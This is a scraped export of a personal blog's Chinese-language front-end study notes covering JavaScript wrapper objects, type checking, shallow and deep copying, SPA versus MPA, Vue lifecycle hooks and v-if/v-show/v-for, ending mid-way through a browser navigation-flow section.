自定义的方法要加载 包装对象的 prototype 上 eg： 1234567Number.prototype.double = function()&#123; return this.valueOf() + this.valueOf();&#125;(123).double() // 246 //要加上圆括号，否则后面的点运算符会被解释成小数123.0.double()123..double()123 .double() 1.5 Boolean 对象 1.5.1 概述 作为构造函数，其主要用于生成布尔值的包装对象实例 123456789let b = new Boolean(false);typeof b // &quot;object&quot;b.valueOf() // falseif(new Boolean(false))&#123; // 因为 得到的是一个对象 所有是 true console.log(true);&#125; 1.5.2 类型转换作用 作为普通函数使用时，boolean 就单纯是一个工具方法Boolean() 的 语法糖为 !! 123456789101112Boolean(undefined) // falseBoolean(null) // falseBoolean(0) // falseBoolean(&#x27;&#x27;) // falseBoolean(NaN) // falseBoolean(1) // trueBoolean(&#x27;false&#x27;) // trueBoolean([]) // trueBoolean(&#123;&#125;) // trueBoolean(function () &#123;&#125;) // trueBoolean(/foo/) // true 1.6 Number 对象 1.6.1 概述 作为构造函数时，用于生成值为数值的对象 作为普通/工具 函数时，可以将任何类型的值转为数值 12let n = new Number(1);Number(true); // 1 1.6.2 静态属性 直接定义在 Number 对象的属性，而不是定义在实例上的，即要用 Number.xxx 访问 123456789101112Number.POSITIVE_INFINITY // Infinity 无穷大Number.NEGATIVE_INFINITY // -Infinity 无穷小Number.NaN // NaN 非数值Number.MAX_VALUE // 1.7976931348623157e+308 Number.MAX_VALUE &lt; Infinity // trueNumber.MIN_VALUE // 5e-324 最小正整数Number.MIN_VALUE &gt; 0 // trueNumber.MAX_SAFE_INTEGER // 9007199254740991 能精确表示的最大整数Number.MIN_SAFE_INTEGER // -9007199254740991 能精确表示的最小整数 1.6.3 实例方法 有四个实例方法，都与数值转换指定格式有关 1.6.3.1 Number.prototype.toString() 部署了自己的 toString 方法，用来将一个数值转换为字符串形式； toString() 括号里可以接收一个参数，表示输出的进制。默认是十进制。 调用的时候也要注意 1.4.3 中的点运算符 1(10).toString( /2/8/16); &quot;10/1010/12/a&quot; 1.6.3.2 Number.prototype.toFixed() 将一个数转为指定位数的小数（ 四舍五入 / 补零），然后返回这个小数对应的字符串 1.6.3.3 Number.prototype.toExponential() 将一个数转为科学计数法形式，然后返回对应的字符串 1.6.3.4 Number.prototype.roPrecision() 将一个数转为指定位数的有效数字（ 四舍五入 / 补零），然后返回对应的字符串 1.6.4 自定义方法 在 Number.protorype 对象上自定义方法，会被 Number 的实例继承 1.7 String 对象 1.7.1 概述 作为构造函数：生成字符串对象，其为一个类似数组的对象（很像数组，但不是数组） 字符串abc对应的字符串对象，有数值键（0、1、2）和length属性，所以可以像数组那样取值 1234new String(&#x27;abc&#x27;)// String &#123;0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;, length: 3&#125;(new String(&#x27;abc&#x27;))[1] // &quot;b&quot; 作为普通函数：将任意类型的值转为字符串 1.7.2 静态方法 String.fromCharCode() 静态方法（即定义在对象本身，而不是定义在对象实例的方法），参数是一个或多个数值，代表 Unicode 码，返回值为这些码组成的字符串。 123String.fromCharCode() // &quot;&quot;String.fromCharCode(97) // &quot;a&quot;String.fromCharCode(104, 101, 108, 108, 111) // &quot;hello&quot; 该方法不支持 Unicode 码点大于0xFFFF的字符 1.7.3 实例属性 String.prototype.length 1.7.4 实例方法 String.prototype.charAt() 返回指定位置的字符：‘abc’.charAt(1) == 'abc'[1] = 'b' String.prototype.charCodeAt() 返回字符串指定位置的 Unicode 码：‘abc’.charCodeAt(1) == 98 String.prototype.concat() 用于连接两个字符串，返回一个新字符串，不改变原字符串，可以有多个参数：s1.concat(s2),'a'.concat('b', 'c') String.prototype.slice() 从原字符串取出子字符串并返回，不改变原字符串。它的第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置(不含) String.prototype.substring() 同上 String.prototype.substr() 同上 String.prototype.indexOf() 用于确定一个字符串在另一个字符串中第一次出现的位置，返回结果是匹配开始的位置； 还可以接受第二个参数，表示从该位置开始向后匹配。 String.prototype.lastIndexOf() 从尾部开始匹配，第二个参数表示从该位置起向前匹配 String.prototype.trim() 去除字符串两端的空格，返回一个新字符串，不改变原字符串； 去除的不仅是空格，还包括制表符（\\t、\\v）、换行符（\\n）和回车符（\\r） String.prototype.toLowerCase()，String.prototype.toUpperCase() 都返回一个新字符串，不改变原字符串 String.prototype.match() 确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回null 返回的数组还有index属性和input属性，分别表示匹配字符串开始的位置和原始字符串 String.prototype.search() 基本等同于match，但是返回值为匹配的第一个位置。如果没有找到匹配，则返回-1 还可以使用正则表达式作为参数。 String.prototype.replace() 用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有g修饰符的正则表达式） String.prototype.split() 按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组 123&#x27;a|b|c&#x27;.split(&#x27;|&#x27;) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]&#x27;a|b|c&#x27;.split(&#x27;&#x27;) // [&quot;a&quot;, &quot;|&quot;, &quot;b&quot;, &quot;|&quot;, &quot;c&quot;]&#x27;a|b|c&#x27;.split() // [&quot;a|b|c&quot;] String.prototype.localeCompare() 用于比较两个字符串。 返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串 还可以有第二个参数，指定所使用的语言（默认是英语 12&#x27;apple&#x27;.localeCompare(&#x27;banana&#x27;) // -1&#x27;apple&#x27;.localeCompare(&#x27;apple&#x27;) // 0 2. 隐式调用 简单说就是自动调用一些方法，而这些方法像钩子一样可以在外部修改，从而改变既定行为。 2.1 数据类型转换 toString 和 valueOf 1234567891011121314151617181920212223242526272829303132333435let a = &#123; i: 1, valueOf: function () &#123; // 改成 =&gt; 就不行 记得看 this 指向 console.log(&quot;valueof&quot;) return this.i++; &#125;, toString: function () &#123; console.log(&quot;tostring&quot;); return this.i++; &#125;&#125;a == 1 // &quot;valueof&quot; trueNumber(a) // &quot;valueof&quot; 2String(a) // &quot;tostring&quot; &quot;3&quot;Boolean(a) // true 因为是对象a + 1 // &quot;valueof&quot; 5String(a) + 1 // &quot;toString&quot; &quot;61&quot;let b = &#123; i: 1, valueOf: function () &#123; console.log(&quot;valueof&quot;) return &#123;&#125;; &#125;, toString: function () &#123; console.log(&quot;tostring&quot;); return &#123;&#125;; &#125;&#125;Number(b) // &quot;valueof&quot; &quot;tostring&quot; Uncaught TypeErrorb == 1 // &quot;valueof&quot; &quot;tostring&quot; Uncaught TypeErrorString(b) // &quot;tostring&quot; &quot;valueof&quot; Uncaught TypeErrorb == &quot;1&quot; // &quot;valueof&quot; &quot;tostring&quot; Uncaught TypeError 在相等 == 运算符 / 加号 + 操作中，（null 除外）对象会先调用 valueOf ，如果返回值是对象，就会调用 toString， 然后用返回的值进行比较 / 加号操作。 Number 和 String 方法中 ，Number 会先调用 valueOf 后调用 toString，String 则相反。 2.2 DOM2 事件中的 handleEvent 12345678let eventObj = &#123; a: 1, handleEvent: function(e)&#123; console.log(this, e); // eventObj ， 事件对象 &#125;&#125;document.addEventListener(&#x27;click&#x27;,eventObj); addEventListener 第二个参数除了函数外还可以是一个对象，事件触发后会执行对象的 handleEvent 方法，方法执行时的 this 指向 eventObj，你可以把想传入的数据绑定在 eventObj 对象上 2.3 JSON 对象 toJSON 2.4 promise 对象的 then 2.5 对象属性存取器 get 和 set 2.6 遍历器接口 Symbol.iterator","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"判断数据类型","slug":"further/01 判断数据类型","date":"2021-12-14T16:00:00.000Z","updated":"2021-12-14T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 判断数据类型","link":"furtherNotes/further/01 判断数据类型","permalink":"https://shylees.github.io/furtherNotes/further/01%20%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B","excerpt":"","text":"通过 手写深拷贝 的 数据的类型判断 方法有点感兴趣 https://juejin.cn/post/6992848107004231687 有问题：https://juejin.cn/post/7004778999226302477 原理：https://juejin.cn/post/6844904081803182087 4种 判断数据类型的方式 0. 数据类型 数据类型：Undefined、Null、Boolean、Number、String、Symbol、BigInt、Object Symbol 是 es6 中引入的一种 原始数据 类型，表示独一无二的值 BigInt 是 es2020 引入的用于解决 js 中数字只能到 53 个二进制位 的问题 基本数据类型 Undefined、Null、Boolean、Number、String、Symbol（es6）、BigInt（es2020） 引用数据类型 Object：Array、Function、Date、RegExp、Error、Arguments 等 1. typeof 1.1 使用 typeof 基本类型 返回相应的类型，除了 null 返回 object typeof 引用类型 返回 object ，除了 函数 返回 function 123456789typeof &#x27;5&#x27; // stringtypeof 5 // numbertypeof null // object ！typeof undefined // undefinedtypeof true // booleantypeof Symbol(&#x27;5&#x27;) // symboltypeof 5n // biginttypeof new Object(); // objecttypeof new Function(); // function ！ Q: typeof 作用于未定义的变量，会报错吗？ A: 不会报错，返回&quot;undefined&quot; Q: typeof Number(1) 的返回值？ A: “number”。 typeof Nmuber(1) // ‘number’ typeof String(‘1’) // ‘string’ typeof Array(1,2) === typeof new Array(1,2) // ‘object’ Number 和 String 作为普通函数调用的时候，把参数转化为相应的原始数据类型，也就是类似于做一个强制类型转换的操作，而不是默认当做构造函数调用。注意和 Array 区分，Array(…) 等价于 new Array(…) Q: typeof new Number(1) 的返回值 A: ‘object’ 1.2 原理 不同对象在底层都表示为二进制，在 Javascript 中二进制低三位存储其类型信息 000：对象 001：整数 010：浮点数 100：字符串 110：布尔值 null：全0 2. instanceof 2.1 使用 是用来判断 变量的原型链上是否有构造函数的 prototype 属性（两个对象是否属于原型链的关系），不一定能获取对象的具体类型 不适用判断原始类型的值，只能用于判断对象是否从属关系 instanceof 的结果并不一定是可靠的，因为在 ECMAScript7 规范中可以通 过自定义 Symbol.hasInstance 方法来覆盖默认行为 1234567891011121314153 instanceof Number // false &#x27;3&#x27; instanceof String // falsetrue instanceof Boolean // false[] instanceof Array; // true[] instanceof Object; // truevar date = new Date() date instanceof Date // true var number = new Number() number instanceof Number // true var string = new String() string instanceof String // true // 空对象&#123;&#125; 的判断let obj1 = &#123;&#125; obj1 instanceof Object // truelet obj2 = Object.create(null) obj2 instanceof Object // falselet obj3 = Object.create(&#123;&#125;) obj3 instanceof Object // true 2.2 原理 instanceof 判断 变量的原型链上是否有构造函数的 prototype 属性 3. __proto__.constructor 原理：每一个实例对象都可以通过 constructor 来访问它的构造函数，其实也是根据原型链的原理来的 由于undefined和null是无效的对象，因此是没有constructor属性的,这两个值不能用这种方法判断.、 123456&#x27;5&#x27;.__proto__.constructor === String // true String 应该是类型[5].__proto__.constructor === Array // true let date = new Date(); date.__proto__.constructor === Date // trueundefined.__proto__.constructor // Cannot read property &#x27;__proto__&#x27; of undefinednull.__proto__.constructor // Cannot read property &#x27;__proto__&#x27; of undefined 4. Object.prototype.toString 返回对象的类型字符串，隐藏可以用来判断一个值的类型 因为实例对象可能会自定义 toString 方法，会覆盖 Object.prototype.toString，所以在使用时，最好加上 call 所有数据类型都可以用这个方法进行检测，且十分精准 12345678910Object.prototype.toString.call(&#x27;5&#x27;) // &quot;[object String]&quot; 字符串Object.prototype.toString.call(5) // [object Number]Object.prototype.toString.call([5]) // [object Array]Object.prototype.toString.call(true) // [object Boolean]Object.prototype.toString.call(undefined) // [object Undefined]Object.prototype.toString.call(null) // [object Null]Object.prototype.toString.call(new Function()); // [object Function]Object.prototype.toString.call(new Date()); // [object Date]Object.prototype.toString.call(new RegExp()); // [object RegExp]Object.prototype.toString.call(new Error()); // [object Error] 5. 总结 typeof 适合基本类型和 function 类型的检测，无法判断 null 和 object instanceof 适合自定义对象，也可以用来检测原生对象，在不同的 iframe 和 window 间检测时失效，还需要注意 Object.create(null) 对象的问题 constructor 基本能判断所有类型，除了 null 和 undefined，但是 constructor 容易被修改，也不能跨 iframe 使用 toString 能判断所有类型，可将其封装为全能的 DateType() 判断所有数据类型","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"深拷贝浅拷贝","slug":"further/01 深拷贝浅拷贝","date":"2021-12-13T16:00:00.000Z","updated":"2021-12-13T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 深拷贝浅拷贝","link":"furtherNotes/further/01 深拷贝浅拷贝","permalink":"https://shylees.github.io/furtherNotes/further/01%20%E6%B7%B1%E6%8B%B7%E8%B4%9D%E6%B5%85%E6%8B%B7%E8%B4%9D","excerpt":"","text":"面试专栏：https://vue3js.cn/interview/JavaScript/copy.html#一、数据类型存储 深拷贝浅拷贝：https://juejin.cn/post/7013603488315736072 messagechannel：https://www.jianshu.com/p/4f07ef18b5d7 深拷贝函数：https://www.cnblogs.com/wangyong1997/p/13577725.html 深拷贝 与 浅拷贝 在日常生 产环境当中，使用完美方案—lodash.cloneDeep，面试问起来的话，重点使用递归实现，JSON、Object.assgin、MessageChannel都可以作为补充。 1. 数据类型存储 基本类型：栈内存 number、null、undefined、boolean、string、symbol、bigint 引用类型：堆内存，引用数据类型的变量是一个指向堆内存中事对象的引用，存在栈中 function、object、array、date、regexp、map、set 浅拷贝：基本类型，拷贝数据；引用类型，拷贝内存地址；即共用引用类型数据。 = 从第一层的引用类型就是共享内存地址 浅拷贝是拷贝一层，深层次的引用类型则共享内存地址 修改第一层的基本数据类型，是不会修改到其他对象的； 但是修改第一层引用类型下面的值时，全都是在操作一个内存地址的值 深拷贝：基本类型 和 引用类型都拷贝数据，不存在共用数据的现象 修改任何对象的属性都不会改变另一个对象的属性 前提为拷贝类型为引用类型的情况下： 浅拷贝是拷贝一层，属性为对象时，浅拷贝是复制，两个对象指向同一个地址 深拷贝是递归拷贝深层次，属性为对象时，深拷贝是新开栈，两个对象指向不同的地址 2. 浅拷贝 Object.assign(target,source[,source2]) // Object Array 扩展运算符 ... // Object Array Array.prototype.slice --- arrO.slice(0) // Array Array.prototype.concat --- arrO.concat() // Array 1234567891011121314151617181920212223242526272829let obj = &#123; a:&#x27;aaa1&#x27;, b:&#123; b1:&#x27;bbb1&#x27; &#125;&#125;let arr = [0,[10,11]]// =let obj2 = obj;obj2.a = &#x27;aaa2&#x27;; // obj2.a === obj.a = &#x27;aaa2&#x27;// assignlet obj3 = Object.assign(&#123;&#125;,obj);obj3.a = &#x27;aaa3&#x27;; // obj3.a = &#x27;aaa3&#x27; obj.a = &#x27;aaa2&#x27; // obj.a 基本类型obj3.b.b1 = &#x27;bbb3&#x27;; // obj3.b === obj.b = &#123; b1: &#x27;bbb3&#x27;&#125; // obj 跟着变化// ...let obj4 = &#123;...obj&#125;;obj4.a = &#x27;aaa4&#x27;; // obj.a = &#x27;aaa2&#x27; obj4.a = &#x27;aaa4&#x27;obj4.b.b1 = &#x27;bbb4&#x27;; // obj.b.b1 === obj4.b.b1 = &#x27;bbb4&#x27;// slicelet arr2 = arr.slice(0);arr2[0] = 20; // arr2[0] = 20 arr[0] = 0arr2[1][1] = 22; // arr[1] === arr2[1] = [11,22];//concatlet arr3 = arr.concat(); 3. 深拷贝 JSON.parse(JSON.stringify()) Jquery.extend() _.cloneDeep() MessageChannel 手写循环递归 123456789101112// JSON.parse(JSON.stringify(obj))let obj5 = JSON.parse(JSON.stringify(obj))obj5.a = &#x27;aaa5&#x27;; // obj5.a = &#x27;aaa5&#x27; obj.a = &#x27;aaa2&#x27;obj5.b.b1 = &#x27;bbb5&#x27;; // obj5.b.b1 = &#x27;bbb5&#x27; obj.b.b1 = &#x27;bbb4&#x27;// jquery.extendconst $ = require(&#x27;jquery&#x27;);let obj6 = $.extend(true, &#123;&#125;, obj);// _.cloneDeepconst _ = require(&#x27;lodash&#x27;);let obj7 = _.cloneDeep(obj) JSON.parse 的问题： 会忽略 undefined 和 symbol 不可以对 Function 进行拷贝，因为 JSON 格式字符串不支持 Function，在序列化时会自动删除 不支持循环对象的拷贝（对象的某个属性的值为其自己） 不能正确处理new Date 不能处理正则 不能处理 new Error() 但遇到的深拷贝的场景很少，而且 99% 用 JSON.stringify 就可以解决 3. ! _.cloneDeep 这是最最最最完美的深拷贝的方式，它已经将会出现问题的各种情况都考虑在内了，所以在日常项目开发当中，建议使用这种成熟的解决方案. 其实lodash解决循环引用的方式，就是用一个栈记录所有被拷贝的引用值，如果再次碰到同样的引用值的时候，不会再去拷贝一遍，而是利用之前已经拷贝好的。 4.MessageChannel MessageChannel 允许我们创建一个新的消息通道，并通过其 postMessage 发送数据，ommessage 接收数据 简单来说，MessageChannel创建了一个通信的管道，这个管道有两个端口，每个端口都可以通过postMessage发送数据，而一个端口只要绑定了onmessage回调方法，就可以接收从另一个端口传过来的数据。 4.1 使用 MessageChannel 1234567891011const channel = new MessageChannel(); // 创建了一个管道var port1 = channel.port1;var port2 = channel.port2; // 获取实例的两个端口 只读port1.onmessage = function(event) &#123; console.log(&quot;port1收的数据：&quot; + event.data);&#125;port2.onmessage = function(event) &#123; console.log(&quot;port2收的数据：&quot; + event.data);&#125;port1.postMessage(&quot;port1发的数据&quot;); // port2收的数据：port1发的数据port2.postMessage(&quot;port2发的数据&quot;); 4.2 使用其进行深拷贝 MessageChannel 的 postMessage 传递数据也是 深拷贝的，与 web worker 的postMessage 一样，而且可以拷贝 undefined 和 循环引用的对象 但拷贝有函数的对象时，会报错。而且是在 异步的 123456789101112function deepcopy(obj)&#123; return new Promise((resolve) =&gt; &#123; const &#123;port1, port2&#125; = new MessageChannel(); // port2将port1 传过来的 obj 返回出去 obj此时就是深拷贝后的 port2.onmessage = event =&gt; resolve(event.data); port1.postMessage(obj); &#125;)&#125;// copy 就是传出来的 深拷贝后的值deepcopy(obj).then((copy) =&gt; &#123; let copyobj = copy; // copyobj 已经不等于 obj了 copy == copyobj ！= obj&#125;) 5. 手写循环递归 判断一个对象的字段是否引用了这个对象或这个对象的任意父级，如果引用了父级，那么就直接返回同级的新对象，反之，进行递归的那套流程。 123456789101112131415161718192021222324252627282930313233343536function deepCopy(obj, cache = new WeakMap())&#123; if(Object.prototypr.toString.call(obj) === &#x27;[object Function]&#x27;)&#123; return new Function(&#x27;return &#x27; + obj.toString()).call(this); &#125; if(obj == null || typeof obj !== &#x27;object&#x27;)&#123; // == null 包含了 null 和 undefined // typeof 除 function 外的引用类型都是 object // 所以 不是funciton又不是其他引用类型的话 就是基本数据类型了 return obj; &#125; // 以下是对 除 function 外的引用类型的处理 if(Object.prototype.toString.call(obj) === &#x27;[object Date]&#x27;)&#123; return new Date(obj); &#125; if(Objcet.prototype.toString.call(obj) === &#x27;[object RegExp]&#x27;)&#123; return new RegExp(obj); &#125; if(Objcet.prototype.toString.call(obj) === &#x27;[object Error]&#x27;)&#123; return new Error(obj); &#125; if(cache.get(obj))&#123; return cache.get(obj); &#125; let copyObj = Object.prototype.toString.call(obj) === &#x27;[object Array]&#x27; ? [] : &#123;&#125;; // let copyObj = Array.isArray(obj) ? [] : &#123;&#125;; // let copyObj = new obj.constructor(); cache.set(obj,copyObj); // 此时 copyObj 还没有数据，下面会进行添加 for(const key in obj)&#123; if(obj.hasOwnPrototype(key))&#123; // 用for in为什么还要判断key是否为obj的自身属性// 辉哥说 因为 for in 遍历的是 可迭代的变量，当在其原型链上时，也是可迭代的，但是却不是本身属性 // 递归拷贝 copyObj[key] = deepCopy(obj[key],cache) &#125; &#125; return copyObj;&#125;","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"单页面、多页面应用","slug":"further/06 单页面应用和多页面应用","date":"2021-12-11T16:00:00.000Z","updated":"2021-12-11T16:00:00.000Z","comments":false,"path":"furtherNotes/further/06 单页面应用和多页面应用","link":"furtherNotes/further/06 单页面应用和多页面应用","permalink":"https://shylees.github.io/furtherNotes/further/06%20%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8%E5%92%8C%E5%A4%9A%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8","excerpt":"","text":"参考链接 https://www.jianshu.com/p/4c9c29967dd6 https://vue3js.cn/interview/vue/spa.html#二、spa和mpa的区别 单页面应用与多页面应用的区别 1. 多页面应用 MPA 多页面应用(multiPage-Page application)：每个页面都是一个主页面，都是独立的，当在访问另一个页面的时候，都需要重新加载 html、css、js 文件。每一次页面跳转时，后台服务器都会返回一个新的 html 文档。 优点： 首屏时间快 页面首个屏幕的内容展现的时间，当访问页面时，服务器返回一个 html，页面就会展示出来，这个过程只经历了一个 http 请求，所以页面展示的速度非常快。 seo 效果好 搜索引擎在做页面排名的时候，要根据页面内容才能给网页权重，来进行网页的排名。搜索引擎是可以识别 html 内容的，而我们在每个页面所有的内容都放在 html 中，所以多页面应用seo排名效果好。 缺点： 页面切换慢 每次跳转都需要发出一个 http 请求，如果网络比较慢，在页面之间来回跳转时，就会有明显的卡顿。 2. 单页面应用 SPA 单页面应用(single-page application)，通过动态重写当前页面来与用户交互，这种方法避免了页面之间切换打断用户体验在单页应用中，所有必要的代码（HTML、JavaScript和CSS）都通过单个页面的加载而检索，或者根据需要（通常是为响应用户操作）动态装载适当的资源并添加到页面，页面在任何时间点都不会重新加载。 优点： 页面切换快 页面每次切换跳转时，不需要做 html 文件的请求，这样就节约了很多 http 发送时延。 缺点： 首屏时间稍慢 首屏时需要请求一次html，同时还要发送一次js请求，两次请求回来了，首屏才会展示出来 seo 差 因为搜索引擎只认识html里的内容，不认识js的内容，而单页应用的内容都是靠js渲染生成出来的，搜索引擎不识别这部分内容，也就不会给一个好的排名，会导致单页应用做出来的网页在百度和谷歌上的排名差。 vue 提供了一些其他技术来解决了单页面的缺点，比如服务端渲染 ssr，通过这些技术可以完美解决这些缺点。 3. 比较 多页应用模式MPA 单页应用模式SPA 构成 由多个完整页面构成 一个外壳页面和多个页面片段构成 跳转方式 整页刷新：页面之间的跳转是从一个页面跳转到另一个页面 局部刷新：页面片段之间的跳转是把一个页面片段删除或隐藏，加载另一个页面片段并显示出来。这是片段之间的模拟跳转，并没有开壳页面 跳转后公共资源是否重新加载 是 否 URL模式 历史模式http://xxx/page1.html 和 http://xxx/page2.html 哈希模式http://xxx/shell.html#page1 和 http://xxx/shell.html#page2 页面切换 页面间切换加载慢，不流畅，用户体验差，特别是在移动设备上 页面片段间的切换快，用户体验好，包括在移动设备上 能否实现转场动画 无法实现 容易实现（手机app动效） 页面间传递数据 依赖URL、cookie或者localstorage，实现麻烦 因为在一个页面内，页面间传递数据很容易实现(这里是我补充，父子之间传值，或vuex或storage之类) 搜索引擎优化（SEO） 可以直接做 需要单独方案做，有点麻烦，可通过 ssr 改善 特别适用的范围 需要对搜索引擎友好的网站 对体验要求高的应用，特别是移动应用 开发难度 低一些，框架选择容易 高一些，需要专门的框架来降低这种模式的开发难度","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"vue生命周期","slug":"further/04 vue 生命周期","date":"2021-12-09T16:00:00.000Z","updated":"2021-12-09T16:00:00.000Z","comments":false,"path":"furtherNotes/further/04 vue 生命周期","link":"furtherNotes/further/04 vue 生命周期","permalink":"https://shylees.github.io/furtherNotes/further/04%20vue%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F","excerpt":"","text":"vue 生命周期 beforeCreate：data 和 methods 中的数据还没有初始化 created：data 和 methods 已经被初始化了，要调用 methods 或 操作 data 中的数据最早只能在这 beforeMount：（模板在内存中编译好，还未挂载到页面上）页面的元素还没被替换过来，还是之前的模板字符串，[render 函数在这被调用，生成虚拟 DOM ] mounted：内存中的模板已经真实的挂载到页面中，是实例创建期间的最后一个生命周期，执行完 mounted 就表示实例已经被完全创建好了，要通过某些插件操作页面上的 DOM 节点，最早要在这 beforeUpdate：组件运行阶段的生命周期，页面中显示的数据还未更新，但data数据是最新的，[数据更新后，新的虚拟 DOM 生成，但还没跟旧虚拟 DOM 对比补丁] update：页面和data已经保持同步了，[新的虚拟 DOM 对比补丁后，进行真实 DOM 的更新] beforeDestory：vue实例进入销毁阶段，实例上所有的 data methods 过滤器 指令都处于可用状态，此时还未真正执行销毁 destoryed：组件已经被完全销毁，此时组件中所有的 data methods… 都已经不可用了 activated：keep-alive 专属，组件被激活时调用 deactivated：keep-alive 专属，组件被销毁时调用 Q：异步请求在哪里发起？ 可以在钩子函数 created、beforeMount、mounted 中进行异步请求，因为这三个函数中，data 已经创建，可以将服务器端返回的数据进行赋值 如果异步请求不需要依赖 dom 推荐在 created 函数中调用异步请求，优点有： 能更快获取到服务器数据，减少页面 loading 时间 ssr 不支持 beforeMount、mounted 钩子函数，所以放在 created 中有助于一致性","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"v-if、v-for、v-show","slug":"further/05 v-if 与 v-show v-for","date":"2021-12-09T16:00:00.000Z","updated":"2021-12-09T16:00:00.000Z","comments":false,"path":"furtherNotes/further/05 v-if 与 v-show v-for","link":"furtherNotes/further/05 v-if 与 v-show v-for","permalink":"https://shylees.github.io/furtherNotes/further/05%20v-if%20%E4%B8%8E%20v-show%20v-for","excerpt":"","text":"参考链接： https://vue3js.cn/interview/vue/show_if.html#一、v-show与v-if的共同点 https://juejin.cn/post/6984210440276410399#heading-18 https://vue3js.cn/interview/vue/if_for.html#二、优先级 v-if 与 v-show 的区别、v-if 为什么不建议与 v-for 一起使用 1. v-show 与 v-if 的区别 控制手段： v-show：显示隐藏式为该元素添加 display 属性，dom 元素一直存在 v-if：显示隐藏式将 dom 元素整个添加或删除 编译条件： v-show：会被编译成指令，条件不满足时控制样式将对应节点隐藏 v-if：会被转换成三元表达式，条件不满足时不渲染 是真正的条件渲染，它会确保在切换过程中，条件块内的事件监听器和子组件销毁和重建，只有渲染条件为假时，不做操作， 编译过程： v-show：简单的基于 css 切换 v-if：有一个局部编译 / 卸载过程，切换过程中适当地销毁和重建内部的事件监听和子组件 状态切换： v-show：不会触发生命周期 v-if：false → true 触发组件的 beforeCreate、created、beforeMount、mounted； ​ true → false 触发组件 beforeDestory、destoryed 性能消耗： v-show：有更高的初始化渲染消耗 v-if：有更高的切换消耗 2. v-if 不建议与 v-for 一起使用 v-if 和 v-for 都是 vue 模板系统中的指令，在 vue 模板编译的时候，会将指令系统转化成可执行的 render 函数。 v-for 比 v-if 的优先级高，当 v-if 和 v-for 在同一个标签时，会先遍历渲染，然后再进行判断是否展示，所以就会渲染一些无用节点，增加无用的 dom 操作，可以通过 computed 或者 &lt;template&gt; 解决 eg： 123&lt;div v-for=&quot;item in [1, 2, 3, 4, 5, 6, 7]&quot; v-if=&quot;item !== 3&quot;&gt; &#123;&#123;item&#125;&#125;&lt;/div&gt; 上面的写法是v-for和v-if同时存在，会先把7个元素都遍历出来，然后再一个个判断是否为3，并把3给隐藏掉，这样的坏处就是，渲染了无用的3节点，增加无用的dom操作，建议使用computed来解决这个问题： 12345678910&lt;div v-for=&quot;item in list&quot;&gt; &#123;&#123;item&#125;&#125;&lt;/div&gt;&lt;script&gt;computed() &#123; list() &#123; return [1, 2, 3, 4, 5, 6, 7].filter(item =&gt; item !== 3) &#125; &#125;&lt;/script&gt; 所以有这样的注意事项： 不要把 v-if v-for 放在同一个元素上，会带来性能方面的浪费 如果避免出现浪费又非得再同一个标签上，可以在外层嵌套 template 标签，页面渲染不会生成 dom 节点，在这层进行 v-if 判断，然后在内部进行 v-for 循环 123&lt;template v-if=&quot;isShow&quot;&gt; &lt;p v-for=&quot;item in items&quot;&gt;&lt;/template&gt; 如果条件出现在循环内部，可以通过计算属性 computed 提前过滤不需要显示的项 123456789computed: &#123; items: function() &#123; return this.list.filter( function (item) &#123; return item.isShow &#125; &#125;) &#125;&#125;","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"导航流程 和 渲染流程","slug":"further/01 导航和渲染流程","date":"2021-12-08T16:00:00.000Z","updated":"2021-12-08T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 导航和渲染流程","link":"furtherNotes/further/01 导航和渲染流程","permalink":"https://shylees.github.io/furtherNotes/further/01%20%E5%AF%BC%E8%88%AA%E5%92%8C%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B","excerpt":"","text":"1. 详细流程 1.1 导航流程 用户输入 当用户在地址栏输入搜索关键字时，地址栏会判断输入的是搜索内容还是url。若是搜索内容，地址栏会根据浏览器的默认搜索引擎合成搜索关键字url；若是url，则会根据协议，合成完整的请求url. 资源请求过程 浏览器进程会通过 IPC进程间的通信 将请求url发送给网络进程，网络进程接收到请求后，会在此发起真正的url请求： 首先查找本地缓存是否缓存了该资源，若有该资源的缓存，则将缓存返回；若无，则进行网络资源请求，进行DNS域名解析，获取请求域名的ip和端口号，若使用了 https 协议，还需要进行 TLS 连接 然后利用该 ip 与服务器进行 tcp 连接，连接后，浏览器开始构建请求头，请求行数据，并将与该域名有关的 cookie 附加到请求头中，将构建好的请求数据发送给服务器 服务器接收到后，根据请求数据，生成响应数据发送给网络进程，当网络进程接收到响应头和响应行数据后，开始解析响应头： ​ 当返回的状态码为 301 / 302 时，说明服务器要让浏览器重定向到其他的url，网络进程会到 响应头的 